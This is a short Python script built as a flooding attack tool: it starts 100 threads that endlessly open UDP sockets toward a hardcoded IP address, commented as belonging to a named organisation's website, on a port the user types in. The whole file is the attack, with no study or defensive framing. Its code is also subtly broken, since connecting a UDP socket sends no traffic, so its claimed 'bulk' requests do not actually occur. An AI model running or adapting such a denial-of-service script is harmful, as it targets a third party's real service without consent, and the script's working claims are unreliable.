import threading
import socket
import random

target_ip = '91.204.209.200'     # IPv4 for "vidyabhartitrusts.org"

target_port = int(input("Enter Target Port:  "))

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        s.connect((target_ip, target_port))
        
        print(f"sent a connection request in bulk: {target_ip}: {target_port}")
        
        
        s.close()
        
for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()